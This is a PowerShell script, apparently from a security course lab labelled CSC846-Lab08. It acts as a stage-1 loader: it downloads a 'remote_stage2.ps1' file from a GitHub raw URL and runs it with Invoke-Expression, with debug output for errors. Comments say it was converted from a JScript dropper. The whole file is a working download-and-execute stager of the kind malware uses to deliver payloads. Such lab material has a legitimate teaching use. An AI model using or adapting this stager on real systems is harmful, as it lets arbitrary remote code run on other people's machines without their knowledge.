# write_debug: Used to show debugging output.
function Write-DebugOutput($str_to_write) {
    if ($debug) {
        # Write-Output is the standard way to write to the console in PowerShell.
        try {
            Write-Output $str_to_write
        } catch {
            # In a PowerShell script, a simple Write-Output is usually sufficient.
            # The catch block is simplified as errors are handled differently than in JScript's try-catch.
            Write-Output ("Error :" + $str_to_write)
        }
    }
}

# Whether Write-DebugOutput will do anything.
$debug = $true

$remoteUrl = "https://raw.githubusercontent.com/kwafula/kwafula.github.io/refs/heads/main/CSC846-Lab08/remote_stage2.ps1" # Replace with your actual URL

try {
    # Stage 2 Step 1: Download the script content using Invoke-WebRequest
    # UseBasicParsing is recommended for scripts without a DOM requirement.
    $response = Invoke-WebRequest -Uri $remoteUrl -Method GET
    
    if ($response.StatusCode -eq 200) {
        $stage2Content = $response.Content
        #Write-DebugOutput ("stage1Content: " + $stage2Content)

        # Stage 2 Step 2: execute remote content
        try {
            # Use Invoke-Expression to execute the string content as PowerShell code.
            # Note: the remote script must be valid PowerShell, not JavaScript, for this to work directly.
            # If the remote script is JS, a different execution method (like calling cscript/wscript) would be needed.
            Invoke-Expression $stage2Content
        } catch {
            Write-DebugOutput "REMOTE CONTENT EVAL ERROR DETAILS:"
            # PowerShell error handling uses $_ to access the current error object
            Write-DebugOutput ("An error message: " + $_.Exception.Message)
        }

        # The parts about FileSystemObject and cscript execution are commented out
        # in the original JS, so they are omitted in this direct conversion.
        Write-DebugOutput "Script executed stage 2 successfully."

    } else {
        Write-DebugOutput ("Failed to download script. Status: " + $response.StatusCode)
    }

} catch {
    Write-DebugOutput "HTTP GET ERROR DETAILS:"
    Write-DebugOutput ("An error message: " + $_.Exception.Message)
}
